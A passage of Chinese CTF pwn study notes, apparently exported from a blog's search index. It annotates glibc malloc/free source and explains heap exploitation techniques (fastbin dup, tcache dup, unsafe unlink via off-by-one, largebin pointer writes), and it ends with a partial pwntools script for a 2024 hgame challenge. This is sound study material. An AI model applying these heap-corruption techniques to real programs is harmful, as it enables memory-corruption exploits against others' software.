获取对应fastbin链 unsigned int idx = fastbin_index(size); fb = &fastbin (av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // 将块 P 插入到 fastbin 中。首先，它将当前 fastbin 的头部指针的值赋给块 P 的 FD 字段 mchunkptr old = *fb, old2; if (SINGLE_THREAD_P){ /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // 检查fastbin的头部chunk是否为当前free的chunk if (__builtin_expect (old == p, 0)) malloc_printerr (\\\"double free or corruption (fasttop)\\\"); // p->old p->fd = old; *fb = p; }else do{ /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (\\\"double free or corruption (fasttop)\\\"); p->fd = old2 = old; }while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been allocated again. */ if (have_lock && old != NULL&& __builtin_expect (fastbin_index (chunksize (old)) != idx, 0)) malloc_printerr (\\\"invalid fastbin entry (free)\\\"); } /* Consolidate other non-mmapped chunks as they arrive. */ // 如果释放的chunk不属于fastbin 且不是mmap分配的 就获取下一个chunk的指针 nextchunk和nextsize // 如果前一个chunk空闲 就合并 通过unlink将该chunk脱离出来 // 如果取出来的chunk下一个chunk也是free chunk 且不为top chunk 则也设置为空闲 // 去除unsortedbin头指针 将合并后的chunk 塞入unsortedbin中 // 如果为top chunk则直接合并 else if (!chunk_is_mmapped(p)) { /* If we're single-threaded, don't lock the arena. */ if (SINGLE_THREAD_P) have_lock = true; if (!have_lock) __libc_lock_lock (av->mutex); nextchunk = chunk_at_offset(p, size); /* Lightweight tests: check whether the block is already the top block. */ // 检查是否等于头一个chunk if (__glibc_unlikely (p == av->top)) malloc_printerr (\\\"double free or corruption (top)\\\"); /* Or whether the next chunk is beyond the boundaries of the arena. */ // 查看下一个chunk是否大于整个内存空间的边界 if (__builtin_expect (contiguous (av) && (char *) nextchunk >= ((char *) av->top + chunksize(av->top)), 0)) malloc_printerr (\\\"double free or corruption (out)\\\"); /* Or whether the block is actually not marked used. */ // 如果通过nextchunk查看下一个chunk是free状态 也就是当前我们要free的chunk 是free状态 则报错double free if (__glibc_unlikely (!prev_inuse(nextchunk))) malloc_printerr (\\\"double free or corruption (!prev)\\\"); // 获取物理上下一个chunk的大小 nextsize = chunksize(nextchunk); // 进行2*size+sz<size<system_mem的传统检查 if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize >= av->system_mem, 0)) malloc_printerr (\\\"free(): invalid next size (normal)\\\"); // 清空要free的chunk free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); // 如果当前chunk的p为0也就是下一个chunk为freechunk则进行合并 /* consolidate backward */ if (!prev_inuse(p)) { // 获取prev_size作为上一个chunk的size大小 prevsize = prev_size (p); // size+prevsize也就是新的chunk的大小 size += prevsize; // 获取上一个chunk的头指针 p = chunk_at_offset(p, -((long) prevsize)); // 进行unlink操作 unlink(av, p, bck, fwd); } // 如果下一个chunk不为top chunk // 下一个chunk也是free chunk 则继续进行合并 if (nextchunk != av->top) { /* get and clear inuse bit */ // 应该是根据指针 和size 算出下一个chunk的size p位置 nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* consolidate forward */ if (!nextinuse) { unlink(av, nextchunk, bck, fwd); size += nextsize; } else // 设置nextchunk size p 的部分清空 clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck->fd; // 检查unsortedbin是否合法 if (__glibc_unlikely (fwd->bk != bck)) malloc_printerr (\\\"free(): corrupted unsorted chunks\\\"); // p入unsortedbin链 p->fd = fwd; p->bk = bck; // 属于largebin大小则设置fd_nextsize bk_nextsize为null if (!in_smallbin_range(size)){ p->fd_nextsize = NULL; p->bk_nextsize = NULL; } // 正式入链 bck->fd = p; fwd->bk = p; //正常设置size 和foot set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } /* If the chunk borders the current high end of memory, consolidate into top */ else { size += nextsize; set_head(p, size | PREV_INUSE); av->top = p; check_chunk(av, p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) { if (atomic_load_relaxed (&av->have_fastchunks)) malloc_consolidate(av); if (av == &main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av->top)) >= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap->ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (!have_lock) __libc_lock_unlock (av->mutex); } /* If the chunk was allocated via mmap, release via munmap(). */ else { munmap_chunk (p); } } \"]},\"110\":{\"h\":\"漏洞利用\",\"t\":[\"我们主要是利用:largechunk中最大的chunk还是小于我们所需求的chunk大小这种情况 我们来详细分析一下这个流程中究竟干了什么\",\"victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) malloc_printerr (\\\"malloc(): largebin double linked list corrupted (nextsize)\\\"); fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; // 以及 victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \",\"我们可以发现 这里的代码 危险的地方在于 如果现在我们能够修改largebin中fwd位置的chunk 我们就能够泄露victim的地址\",\"我们主要利用这两行代码\",\"victim->bk_nextsize->fd_nextsize = victim; bck->fd = victim; \",\"如何实现？比如\",\"我们修改largebin中的chunk 也就是fwd的bk为我们想要泄露到的目标地址-0x10时 \",\"所以fwd->bk->fd也就是目标地址\",\"阅读前后逻辑我们知道这段代码中bck=fwd->bk\",\"bck->fd 最后被赋值victim\",\"所以也就是fwd->bk->fd被赋值victim 也就是目标地址赋值victim\",\"我们修改fwd的bk_nextsize为目标地址-0x20\",\"所以fwd->bk_nextsize->fd_nextsize等于目标地址\",\"然后也因为victim->bk_nextsize = fwd->bk_nextsize; 和victim->bk_nextsize->fd_nextsize = victim所以等价替换\",\"fwd->bk_nextsize->fd_nextsize=victim也就是目标地址等于victim\"]},\"111\":{\"h\":\"深入学习堆结构\",\"t\":[\"做hgame的时候 有点做不动heap的题 所以来学习一下基本功学习文章:【pwn】学pwn日记（堆结构学习）（随缘更新）_pwn 堆特性-CSDN博客\"]},\"112\":{\"h\":\"堆管理器\",\"t\":[\"在linux中 堆管理器 由libc.so.6链接库实现\",\"brk\",\"mmap\",\"brk函数\",\"申请小的内存空间 从heap下方的data段 向上申请内存\",\"mmap函数\",\"一般申请较大的内存空间 从shared libraries里面开新的空间\",\"子线程只能用mmap函数\"]},\"113\":{\"h\":\"流程\",\"t\":[\"用户使用malloc函数向堆管理器申请一块内存空间\",\"堆管理器用brk或者mmap函数去获取内存\"]},\"114\":{\"h\":\"chunk结构\",\"t\":[\"完整的chunk 一般是prev_size ,size(含AMP),fd, bk, fd,_nextsize,bk,_nextsize这几个组成\",\"需要注意的是 prev_size有且仅当 上一个chunk处于free状态的时候来表示 上一个chunk的大小否则 就作为上一个chunk的一部分来存数据\",\"chunk_struct\",\"alloced chunk 由于是使用状态所以 在使用的就只有prev_size 和size两个部分\",\"alloced_chunk\",\"free chunk常见的就是携带fd 和bk 然后当p为0的时候 两个chunk会合并为一个较大的chunk\",\"fast bin的chunk\",\"保留最基本结构 最简单的结构 也就是 prev_size+size+fd+data 所以 fastbin最小结构为0x20 也就是4* 0x8(64位)\",\"top chunk 也就是一个超大的chunk 用户申请内存的时候 会先搜索bins 然后再搜索top chunk实在不够才会去调用brk函数申请空间 然后再从top chunk中申请\"]},\"115\":{\"h\":\"申请内存的过程\",\"t\":[\"这里原文章讲特别好 我直接copy了(虽然之前也是copy)\",\"申请内存<64bytes 则从tcachebin(tcachebin 从glibc2.26引入),fast bins或者smallbin找\",\"申请内存 >64bytes 则从unsorted bin找\",\"unsorted bin无和是bin则遍历unsorted bin合并free chunk 然后找 如果有合适的就直接给 否则将合并后的放入对应bin\",\"去large bin找\",\"向top chunk中找\",\"brk函数申请 然后从top chunk中找\",\"mmap函数 申请 然后从top chunk中找\",\"当我们申请0xn0和0xn8内存大小的时候 系统其实给我们的是一样的chunk大小 因为我们可以利用下一面一个chunk的prev_size的空间 刚好0x8的空间(64位)\"]},\"116\":{\"h\":\"NTUSTISC - Pwn 2学习笔记\",\"t\":[\"查看glibc的源码网址:https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c\"]},\"117\":{\"h\":\"TSL 了解\"},\"118\":{\"h\":\"gdb 如何查 fs？\",\"t\":[\"print (void)arch_prctl(option_num,addr) \",\"option_num 是决定是我们的操作 比如0x1003就是取fs的值\",\"addr就是取fs放在什么地方\",\"pwngdb的话直接输入tls也可以查到\"]},\"119\":{\"h\":\"bin\"},\"120\":{\"h\":\"free 源码分析\",\"t\":[\"运行_int_free函数\",\"如果size小于get_max_fast()就进入fastbin\",\"通过fastbin_index(size)获取对应大小的fastbin\",\"fastbin(av,idx)获取fastbin的位置\",\"然后chunk入链\"]},\"121\":{\"h\":\"malloc源码分析\",\"t\":[\"运行_int_malloc函数\",\"先获取我们真正需要的 chunk 大小\",\"判断是否是fastbin范围\",\"获取对应大小的fastbin然后获取位置\",\"然后 chunk出链\"]},\"122\":{\"h\":\"Fastbin\",\"t\":[\"fd指向下一个free chunk的chunk head(也就是下一个free的chunk)\",\"不去修改p\"]},\"123\":{\"h\":\"Tcache\",\"t\":[\"从libc2.26开始引入\",\"从0x20到0x410\",\"每个tcache最多收取7个chunk\",\"用结构tcache_perthread_struct管理tcache\",\"存在于TLS\",\"一共两个部分 一个是对应大小的tcache bin的链表(每个最多存7个chunk) 一个是对应链表的元素数量\",\"chunk的bk是一串随机的安全数 防止double free的\",\"fd指向的是 下一个free chunk的mem(也就是payload的部分)\"]},\"124\":{\"h\":\"Fastbin dup\",\"t\":[\"算是一个正式的攻击手段\",\"利用double free让整个链表陷入循环\",\"比如现在fastBin->chunk1->chunk2 然后此时chunk1的fd指向chunk2然后我们再次free chunk2那么chunk2的fd指向chunk1就会变成:fastBin->chunk2->chunk1->chunk2->chunk1的死循环\",\"然后我们malloc一下 获取了chunk2然后此时链表:fastbin->chunk1->chunk2->chunk1...\",\"然后我们修改chunk2fd指向我们想要修改的地方 那么链表:fastbin->chunk1->chunk2->addr_we_want\",\"那么我们malloc三次获取我们想要的地址的读写权\",\"记住是我们想要写入地址-0x10 因为还有prev_size+size\",\"然后根据源码 我们可以知道\",\"size检查\",\"我们的size得>=2*SIZE_SZ然后必须<=av->system_mem\",\" if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); mutex_lock(&av->mutex); locked = 1; chunk_at_offset (p, size)->size <= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) >= av->system_mem; })) { errstr = \\\"free(): invalid next size (fast)\\\"; goto errout; } if (! have_lock) { (void)mutex_unlock(&av->mutex); locked = 0; } } \",\"检查double chunk\",\"仅仅是检查bin中第一个chunk是否是相同的chunk\",\"free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &fastbin (av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \\\"double free or corruption (fasttop)\\\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock && old != NULL) old_idx = fastbin_index(chunksize(old)); p->fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock && old != NULL && __builtin_expect (old_idx != idx, 0)) { errstr = \\\"invalid fastbin entry (free)\\\"; goto errout; } \"]},\"125\":{\"h\":\"Tcache利用\",\"t\":[\"大多数性质和fastbin是一样的 但是calloc是不会拿tcache的 所以我们一般把tcache填满来绕过\"]},\"126\":{\"h\":\"NTUSTISC-PWN3阅读笔记（1）\",\"t\":[\"主要是看NTUSTISC\"]},\"127\":{\"h\":\"tcache dup\",\"t\":[\"tcache在libc2.31里面引用了key检查 然后在malloc的时候没有检查size 其次tcache的fd指向的是chunk data\",\"会在free进入tcache后在bk位置写入随机数 用于检查\",\"当检查一样时候 会for循环迭代tcache查看是否有指针和这个即将free的chunk的指针一样\",\"如果一样提示double free\",\"size_t tc_idx = csize2tidx (size); if (tcache != NULL && tc_idx < mp_.tcache_bins) { /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^<size_t> chance), so verify it's not an unlikely coincidence before aborting. */ // 这里就是检查bk是否等于tcache if (__glibc_unlikely (e->key == tcache)) { tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next) if (tmp == e) malloc_printerr (\\\"free(): double free detected in tcache 2\\\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ } if (tcache->counts[tc_idx] < mp_.tcache_count) { tcache_put (p, tc_idx); return; } } \"]},\"128\":{\"h\":\"UnsortedBin\",\"t\":[\"被free的chunk的上一块chunk是free chunk就合并\",\"如果下一块chunk是top chunk则合并到top chunk里面\",\"首个是main_arena然后双向链表\"]},\"129\":{\"h\":\"Consolidate\",\"t\":[\"unsortedBin在合并的时候 会使用unlink_chunk进行一个拖链操作\",\"首先获取p的size然后去找到下一个chunk 看下一个chunk的prev_size是否等于这个size\",\"通过p的fd获取上一个chunk bk获取下一个chunk\",\"FD = p->fd\",\"BK = p->bk\",\"然后FD->bk和BK->fd是否等于p\",\"然后BK->bk等于FD andFd->fd等于BK\",\"这样就完成了脱链操作\",\"static void unlink_chunk (mstate av, mchunkptr p) { if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); mchunkptr fd = p->fd; mchunkptr bk = p->bk; if (__builtin_expect (fd->bk != p || bk->fd != p, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); fd->bk = bk; bk->fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL) { if (p->fd_nextsize->bk_nextsize != p || p->bk_nextsize->fd_nextsize != p) malloc_printerr (\\\"corrupted double-linked list (not small)\\\"); if (fd->fd_nextsize == NULL) { if (p->fd_nextsize == p) fd->fd_nextsize = fd->bk_nextsize = fd; else { fd->fd_nextsize = p->fd_nextsize; fd->bk_nextsize = p->bk_nextsize; p->fd_nextsize->bk_nextsize = fd; p->bk_nextsize->fd_nextsize = fd; } } else { p->fd_nextsize->bk_nextsize = p->bk_nextsize; p->bk_nextsize->fd_nextsize = p->fd_nextsize; } } } \"]},\"130\":{\"h\":\"UnsafeUnlink + off_by_one\",\"t\":[\"这里主要是绕过unlink 来实现一个fake chunk的利用 主要运用在\",\"fakeUnlink\",\"当我们可以多写一个字节的时候我们可以构造一个fake chunk\",\"prev_size 0即可\",\"size payload的长度+1\",\"fd和bk\",\"这两个就比较重要了 因为要绕过unlink的安全检查 也就是检查FD->bk == p == BK->fd and p->size = nextchunk(p)->prev_size\",\"所以我们可以构造fd为ptr-0x18 那么FD->bk也就是FD+0X18的位置为p 绕过检查\",\"bk 同理设计为ptr-0x10\",\"next_chunk_prev_size 也就是下一个chunk的prev_size 这个构造等于payload的长度\",\"然后多的一个字节为0的话 我们就相当于chunk的p为0也就是我们构造的fake chunk会被当做free chunk而且这个free chunk的起始位置是根据prev_size来定的\",\"然后那么根据源码最终ptr会指向fd也就是ptr-0x18的位置\",\"这里的fd->bk和bk->fd都是p\",\" if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); mchunkptr fd = p->fd; mchunkptr bk = p->bk; if (__builtin_expect (fd->bk != p || bk->fd != p, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); fd->bk = bk; bk->fd = fd; \"]},\"131\":{\"h\":\"多线程pwn(ptmalloc)\",\"t\":[\"参考文章:ptmalloc堆概述-多线程支持_ptmalloc主arena存在的意义-CSDN博客\",\"推荐(讲得很清晰):ptmalloc源码分析 - 主分配区和非主分配区Arena的实现（04）_malloc main arena-CSDN博客\",\"ptmalloc源码分析 - 分配区状态机malloc_state（02）-CSDN博客\",\"ptmalloc源码分析 - 分配区heap_info结构实现（05）-CSDN博客\"]},\"132\":{\"h\":\"主分配区 和 非主分配区\",\"t\":[\"ptmalloc通过malloc_state结构体来管理内存的分配等一系列操作 我们可以看见我们相对熟悉的fastbinsY和bins也就是我们接触最多的fastbin,unsortedbin,smallbin,largebin等 这里我们主要观察next,next_free\",\"ptmalloc中用主分配区和非主分配区用来解决线程争夺问题\",\"非主分配区用mmap来映射获取内存\",\"主分配区和非主分配区用next形成一个环形链表进行管理 next链接的是非主分配区\",\"/* 分配区全局链表：分配区链表，主分配区放头部，新加入的分配区放main_arean.next 位置 Linked list */ struct malloc_state *next; \",\"/** * 全局malloc状态管理 */ struct malloc_state { /* Serialize access. 同步访问互斥锁 */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). * 用于标记当前主分配区的状态 * */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ /* 用于标记是否有fastchunk */ int have_fastchunks; /* Fastbins fast bins。 * fast bins是bins的高速缓冲区，大约有10个定长队列。 * 当用户释放一块不大于max_fast（默认值64）的chunk（一般小内存）的时候，会默认会被放到fast bins上。 * */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ /* Top chunk ：并不是所有的chunk都会被放到bins上。 * top chunk相当于分配区的顶部空闲内存，当bins上都不能满足内存分配要求的时候，就会来top chunk上分配。 */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above * 常规 bins chunk的链表数组 * 1. unsorted bin：是bins的一个缓冲区。当用户释放的内存大于max_fast或者fast bins合并后的chunk都会进入unsorted bin上 * 2. small bins和large bins。small bins和large bins是真正用来放置chunk双向链表的。每个bin之间相差8个字节，并且通过上面的这个列表， * 可以快速定位到合适大小的空闲chunk。 * 3. 下标1是unsorted bin，2到63是small bin，64到126是large bin，共126个bin * */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins * 表示bin数组当中某一个下标的bin是否为空，用来在分配的时候加速 * */ unsigned int binmap[BINMAPSIZE]; /* 分配区全局链表：分配区链表，主分配区放头部，新加入的分配区放main_arean.next 位置 Linked list */ struct malloc_state *next; /* 分配区空闲链表 Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ // 空闲链表的状态记录，0-空闲，n-正在使用中，关联的线程个数（一个分配区可以给多个线程使用） INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; \"]},\"133\":{\"h\":\"多线程分配\",\"t\":[\"malloc/arena.c/_int_new_arena函数中\"]},\"134\":{\"h\":\"流程\",\"t\":[\"线程中malloc 会检查线程中是否存在分配区，如果存在直接加锁，并且进行内存分配\",\"否则通过next遍历链表查看有未加锁分配区 然后加锁分配\",\"如果无的话 会ptamlloc一个新的分配区 加入malloc_state->next 然后加锁进行分配\",\"下方是malloc一个新的分区的情况\",\"__libc_lock_init (a->mutex); __libc_lock_lock (list_lock); /* Add the new arena to the global list. */ a->next = main_arena.next; /* FIXME: The barrier is an attempt to synchronize with read access in reused_arena, which does not acquire list_lock while traversing the list. */ atomic_write_barrier (); main_arena.next = a; __libc_lock_unlock (list_lock); __libc_lock_lock (free_list_lock); detach_arena (replaced_arena); __libc_lock_unlock (free_list_lock); \"]},\"135\":{\"h\":\"调用链:\",\"t\":[\"__libc_malloc-> arena_get arena_get2-> _int_new_arena \",\"先调用arena_get失败则调用arena_get2然后arena_get2中如果分配没有满则调用_int_new_arena满了调用reused_arena\"]},\"136\":{\"h\":\"arena_get\",\"t\":[\"调用主要是__libc_malloc函数中\",\"从thread_arena中获取分配区 如果成功则加锁 没有成功则通过arena_get2进行分配区的申请与初始化\",\"每个线程都会设置这么一个变量thread_arena 该变量保存对应的分配区。如果是主线程，则thread_arena设置成main_arena。\",\"main_arena是在ptamlloc_init的时候初始化的 主线程对应主分配区\",\"#define arena_get(ptr, size) do { \\\\ ptr = thread_arena; \\\\ arena_lock (ptr, size); \\\\ } while (0) static mstate arena_get_retry (mstate ar_ptr, size_t bytes) { LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr); if (ar_ptr != &main_arena) { __libc_lock_unlock (ar_ptr->mutex); ar_ptr = &main_arena; __libc_lock_lock (ar_ptr->mutex); } else { __libc_lock_unlock (ar_ptr->mutex); ar_ptr = arena_get2 (bytes, ar_ptr); } return ar_ptr; } \",\"image-20240506184605509\"]},\"137\":{\"h\":\"arena_get2\",\"t\":[\"这里出现的arena数量的上限 64位数量是8*cores+1 32位是2*cores+1\",\" static mstate arena_get2 (size_t size, mstate avoid_arena) { mstate a; static size_t narenas_limit; // 从空闲链表中获取一个分配区，如果空闲链表中有该分配区，则直接使用，返回结果 a = get_free_list (); // 获取失败的情况 if (a == NULL) { /* Nothing immediately available, so generate a new arena. */ if (narenas_limit == 0) { if (mp_.arena_max != 0) narenas_limit = mp_.arena_max; else if (narenas > mp_.arena_test) { int n = __get_nprocs_sched (); if (n >= 1) narenas_limit = NARENAS_FROM_NCORES (n); else /* We have no information about the system. Assume two cores. */ narenas_limit = NARENAS_FROM_NCORES (2); } } repeat:; size_t n = narenas; /* NB: the following depends on the fact that (size_t)0 - 1 is a very large number and that the underflow is OK. If arena_max is set the value of arena_test is irrelevant. If arena_test is set but narenas is not yet larger or equal to arena_test narenas_limit is 0. There is no possibility for narenas to be too big for the test to always fail since there is not enough address space to create that many arenas. */ if (__glibc_unlikely (n <= narenas_limit - 1)) { if (catomic_compare_and_exchange_bool_acq (&narenas, n + 1, n)) goto repeat; a = _int_new_arena (size); if (__glibc_unlikely (a == NULL)) catomic_decrement (&narenas); } else // 如果 a = reused_arena (avoid_arena); } return a; } \"]},\"138\":{\"h\":\"_int_new_arena (new arena)\",\"t\":[\"创建一个非主分配区\",\"/** * 初始化一个新的分配区arena * 该函数主要创建：非主分配区 * 主分配区在ptmalloc_init中初始化，并且设置了全局变量main_arena的值 */ static mstate _int_new_arena(size_t size) { mstate a; heap_info *h; char *ptr; unsigned long misalign; /* 分配一个heap_info，用于记录堆的信息，非主分配区一般都是通过MMAP向系统申请内存；非主分配区申请后，是不能被销毁的 */ // new_heap是仅仅在非主分配区使用的 h = new_heap(size + (sizeof(*h) + sizeof(*a) + MALLOC_ALIGNMENT), mp_.top_pad);å if (!h) { /* Maybe size is too large to fit in a single heap. So, just try to create a minimally-sized arena and let _int_malloc() attempt to deal with the large request via mmap_chunk(). */ h = new_heap(sizeof(*h) + sizeof(*a) + MALLOC_ALIGNMENT, mp_.top_pad); if (!h) return 0; } a = h->ar_ptr = (mstate)(h + 1); //heap_info->ar_ptr的值设置成mstate的分配区状态机的数据结构 malloc_init_state(a); //初始化mstate a->attached_threads = 1; //设置进程关联个数 /*a->next = NULL;*/ a->system_mem = a->max_system_mem = h->size; /* Set up the top chunk, with proper alignment. */ ptr = (char *) (a + 1); misalign = (unsigned long) chunk2mem(ptr) & MALLOC_ALIGN_MASK; if (misalign > 0) ptr += MALLOC_ALIGNMENT - misalign; top (a) = (mchunkptr) ptr; set_head(top(a), (((char *) h + h->size) - ptr) | PREV_INUSE); LIBC_PROBE(memory_arena_new, 2, a, size); mstate replaced_arena = thread_arena; thread_arena = a; //将当前线程设置mstate __libc_lock_init(a->mutex); //初始化分配区锁 __libc_lock_lock(list_lock); //加上分配区锁 /* 将新的分配区加入到全局链表上，新申请的分配区都会放入主分配区的下一个位置*/ /* Add the new arena to the global list. */ a->next = main_arena.next; /* FIXME: The barrier is an attempt to synchronize with read access in reused_arena, which does not acquire list_lock while traversing the list. */ atomic_write_barrier(); main_arena.next = a; __libc_lock_unlock(list_lock); /* 调整attached_threads状态*/ __libc_lock_lock(free_list_lock); detach_arena(replaced_arena); __libc_lock_unlock(free_list_lock); __malloc_fork_lock_parent. */ __libc_lock_lock(a->mutex); //解除分配区锁 return a; } /* Remove the arena from the free list (if it is present). free_list_lock must have been acquired by the caller. 移动链表地址，移除free_list上的分配区结构*/ static void remove_from_free_list(mstate arena) { mstate *previous = &free_list; for (mstate p = free_list; p != NULL; p = p->next_free) { assert(p->attached_threads == 0); if (p == arena) { /* Remove the requested arena from the list. */ *previous = p->next_free; break; } else previous = &p->next_free; } } \"]},\"139\":{\"h\":\"reused_arena\",\"t\":[\"简单来说就是遍历整个分配区表判断是否有锁 没锁就能用 这样就可以实现循环利用\"]},\"140\":{\"h\":\"记一次失败的UnsoretedBin 泄露libc（2024hgameWeek3 [1]）\",\"t\":[\"什么都pwn只会害了你\",\"2024 hgame的week3的一道题 libc版本2.27 虽然这个思路失败了 但是觉得还是学了东西 就记录下来\"]},\"141\":{\"h\":\"题目\",\"t\":[\"main函数\",\"​ \",\"add函数\",\"add\",\"delete函数\",\"delete\",\"show函数\",\"show\"]},\"142\":{\"h\":\"原理\",\"t\":[\"首先libc版本为2.27 引入了tcache并且没有引入bk随机数安全检查机制\",\"tcache bin的范围为:0x20-0x420\",\"tcache bin单个区间大小的链表长度最长为7个\",\"然后根据add函数的逻辑 我们一次性只能new一个0xff大小的chunk 显然不足以超过tcache bin的大小 所以我们得先填充满tcache\",\"unsorted bin是一个双向链表\",\"unsorted bin中第一个chunk的bk和最后一个chunk的fd都指向main_arena+48（32位）或main_arena+88（64位）的位置\",\"所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了main_arena+88的位置\",\"我们先把unsorted bin大小的chunk申请下来 然后再free 让fd和bk填充进去 然后malloc要回来\"]},\"143\":{\"h\":\"实践\",\"t\":[\"from pwn import * # r = process(\\\"./vuln\\\") r = gdb.debug(\\\"./vuln\\\",\\\"b *main+33\\\") class FakeChunk: def __init__(self): self.prev_size = p64(0) self.size = p64(0) self.fd = p64(0) self.bk = p64(0) self.payload = b\\\"\\\" self.next_chunk_prev_size = p64(0) def get_chunk_str(self): chunk = b\\\"\\\" chunk += self.prev_size chunk += self.size chunk += self.fd chunk += self.bk chunk += self.payload return chunk # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置 def set_chunk(self,size,ptr): self.prev_size = p64(0) self.size = p64(size +1) self.fd = p64(ptr-0x18) self.bk = p64(ptr-0x10) self.next_chunk_prev_size = p64(size) self.payload = (size - 32)*b\\\"a\\\" + self.next_chunk_prev_size print(f\\\"构造的chunk:\\\\n\\\\tprev_size:0\\\\n\\\\tsize:{ size }\\\\n\\\\tfd:{ hex(size +1) }\\\\n\\\\tbk:{ hex(ptr-0x10) }\\\\n\\\\tpatload长度:{ len(self.payload) }\\\\n\\\\t总长度:{ len(self.get_chunk_str()) }\\\") def waite_menu(): print(r.recvuntil(b\\\"Your choice:\\\")) def show(index): waite_menu() r.sendline(b\\\"2\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) def delete(index): waite_menu() r.sendline(b\\\"3\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(f\\\"------------------\\\\n删除index为{ index }的chunk\\\\n------------------\\\") def add(index,size,content): waite_menu() r.sendline(b\\\"1\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(r.recvuntil(b\\\"Size: \\\")) r.sendline(str(size)) print(r.recvuntil(b\\\"Content: \\\")) r.send(content) print(f\\\"------------------\\\\n添加index为{ index }的chunk\\\\n------------------\\\") # fake_chunk = FakeChunk() # fake_chunk.set_chunk(size=0xa8,) for i in range(10): print(\\\"i :\\\",i) add(i,0xa0,b\\\"\\\\x00\\\") for i in range(8): print(\\\"i :\\\",i) delete(i) for i in range(8): print(\\\"i :\\\",i) add(i, 0xa0, b\\\"\\\\x00\\\") r.interactive() \",\"先malloc 10个chunk(大于8个就行)\",\"因为如果unsorted bin的chunk和top chunk相邻会被直接合并 所以我们需要一个alloced chunk挡在top chunk前\",\"然后free 8个chunk 让tcache bin的位置填满 然后malloc 8个 让tcache bin先被消耗掉\",\"因为当tcache chunk有大小合适的 chunk的时候 优先取 tcache chunk然后再去寻找unsorted bin\",\"然后我发现一个状况 就是新获得unsroted bin中的chunk fd和bk都被清空了\",\"empty\",\"并且通过测试发现只要是刚好要malloc的chunk大小如何符合 